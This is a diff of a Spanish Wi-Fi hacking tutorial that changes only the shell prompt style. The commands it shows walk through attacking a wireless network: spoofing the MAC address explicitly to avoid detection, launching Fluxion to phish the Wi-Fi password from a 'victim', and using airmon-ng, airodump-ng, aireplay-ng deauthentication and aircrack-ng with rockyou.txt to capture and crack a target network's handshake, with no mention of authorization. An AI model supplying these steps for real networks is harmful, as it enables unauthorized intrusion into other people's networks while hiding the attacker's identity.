@@ -27,9 +27,11 @@ El Phishing y la Fuerza bruta de contraseñas, la primera consiste en engañar a
 Antes de empezar la ejecución de estas dos técnicas, un bonus para falsificar vuestra MAC y sea mas difícil detectar quien esta por detrás, ejecutáis lo siguiente haciendo uso de la herramienta “**macchanger**”:
 
 ```bash
-root@parrot:# apt install macchanger -y #Desargar la herramienta en caso de no tenerla
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ apt install macchanger -y #Desargar la herramienta en caso de no tenerla
 
-root@parrot:# macchanger -r <InferfazDeRed> #Ex: macchanger -r wlan0
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ macchanger -r <InferfazDeRed> #Ex: macchanger -r wlan0
 ```
 
 El segundo comando anterior lo que hace es cambiar la MAC de vuestra interfaz de red a una aleatoria.
@@ -45,17 +47,21 @@ Para la primera técnica vamos a hacer uso de “**Fluxion**”, una herramienta
 Su uso es muy sencillo, lo primero que debemos hacer es clonar el repositorio de GitHub [https://github.com/FluxionNetwork/fluxion] para descargar la herramienta en nuestro sistema Linux y ya podríamos empezar con la post-explotación.
 
 ```bash
-root@parrot:# git clone https://github.com/FluxionNetwork/fluxion #Clonar el repositorio
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ git clone https://github.com/FluxionNetwork/fluxion #Clonar el repositorio
 ```
 
 Una vez clonada, entramos en la carpeta de la herramienta y ejecutamos el script hecho en bash llamado fluxion.sh.
 
 ```bash
-root@parrot:# cd fluxion #Para acceder a la carpeta
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ cd fluxion #Para acceder a la carpeta
 
-root@parrot:# chmod +x fluxion.sh #Dar permisos de ejecución al script
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ chmod +x fluxion.sh #Dar permisos de ejecución al script
 
-root@parrot:# ./fluxion.sh -i #Ejecucion del script && instalación de dependencias
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ ./fluxion.sh -i #Ejecucion del script && instalación de dependencias
 ``` 
 
 Así se vería la herramienta ejecutada:
@@ -165,25 +171,29 @@ En esta ocasión utilizaremos 3 herramientas de la suite de “Aircrack-ng” ma
 Lo primordial para el hacking de redes WI-FI es poner la interfaz de red en modo monitor, para ello primero debemos matar a los procesos que nos lo impiden, suelen ser el dos, el primero “wpa_supplicant” y el segundo “dhcclient” para matarlos hacemos uso del siguiente comando:
 
 ```bash
-root@parrot:# airmon-ng check kill
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ airmon-ng check kill
 ```
 
 o si los queremos matar uno por uno:
 
 ```bash
-root@parrot:# airmon-ng kill <PID> o <NombreDeProceso>
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ airmon-ng kill <PID> o <NombreDeProceso>
 ```
 
 Una vez matados los procesos perderemos la conexión a Internet, para no perder la conexión hay que conectar el cable a la entrada RJ-45, ahora solo faltaría poner nuestra interfaz en modo monitor, para ello hacemos uso del comando:
 
 ```bash
-root@parrot:# airmon-ng start <InterfazDeRed> #Ex: airmon-ng wlan0
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ airmon-ng start <InterfazDeRed> #Ex: airmon-ng wlan0
 ```
 
 Para verificar que nuestra de interfaz de red esta en modo monitor ejecutamos:
 
 ```bash
-root@parrot:# iwconifig
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ iwconifig
 ```
 
 Si nos sale el nombre de nuestra interfaz de red junto a “mon”, quiere decir que vamos por buen camino.
@@ -193,7 +203,8 @@ Si nos sale el nombre de nuestra interfaz de red junto a “mon”, quiere decir
 Vamos a empezar escaneando la red haciendo uso de “airodump-ng” con la siguiente sintaxis:
 
 ```bash
-root@parrot:# airodump-ng <InterfazDeRed+mon> #Ex: airodump-ng wlan0mon
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ airodump-ng <InterfazDeRed+mon> #Ex: airodump-ng wlan0mon
 ```
 
 <p align="center">
@@ -203,13 +214,15 @@ root@parrot:# airodump-ng <InterfazDeRed+mon> #Ex: airodump-ng wlan0mon
 Una vez ya tengáis bastantes redes a vuestra disposición una gran variedad de redes escaneadas, ejecutáis este comando a la red a atacar:
 
 ```bash
-root@parrot:# airodump-ng -c <canal> --bssid <BSSID> -w psk <ESSID> #Ex: airodump-ng -c --bssid 90:CD:B6:83:43:B2 -w psk Oppo
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ airodump-ng -c <canal> --bssid <BSSID> -w psk <ESSID> #Ex: airodump-ng -c --bssid 90:CD:B6:83:43:B2 -w psk Oppo
 ``` 
   
 Ahora necesitamos hacer la “deauthentication”, para ello vamos a hacer uso de la herramienta “aireplay-ng” esta herramienta nos va a permitir enviar paquetes a un cliente en especifico, o a toda la red si así lo preferimos para hacer la captura del apretón de manos, su sintaxis es la siguiente:
 
 ```bash
-root@parrot:# aireplay-ng <0-”PaquetesAenviar”> -a <BSSID> -c <BSSIDClienteEspecifico> <InterfazDeRed> #aireplay-ng 0-10 -a 90:CD:B6:83:43:B2 -c 43:53:D4:34:D5:54 wlan0mon
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ aireplay-ng <0-”PaquetesAenviar”> -a <BSSID> -c <BSSIDClienteEspecifico> <InterfazDeRed> #aireplay-ng 0-10 -a 90:CD:B6:83:43:B2 -c 43:53:D4:34:D5:54 wlan0mon
 ```
 
 **Nota:** *Puede no ser cuestión de tiempo la captura del “handshake”
@@ -219,7 +232,8 @@ Ahora si vamos a utilizar “Aircrack-ng”, la navaja suiza del hacking de Rede
 Con el siguiente comando empezaríamos el ataque:
 
 ```bash
-root@parrot:# aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> psk*.cap
+┌─[root@parrot]─[/home/wackyhacker/Desktop]
+└──╼ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <BSSID> psk*.cap
 ``` 
 
 **Nota:** *Este método no es tan efectivo como el primero, ya que este hace uso de un diccionario. Si la contraseña es robusta es posible que no se llegue a crackear, en cambio el otro da igual la complejidad que tenga la contraseña, es más por el sentido común de la víctima.
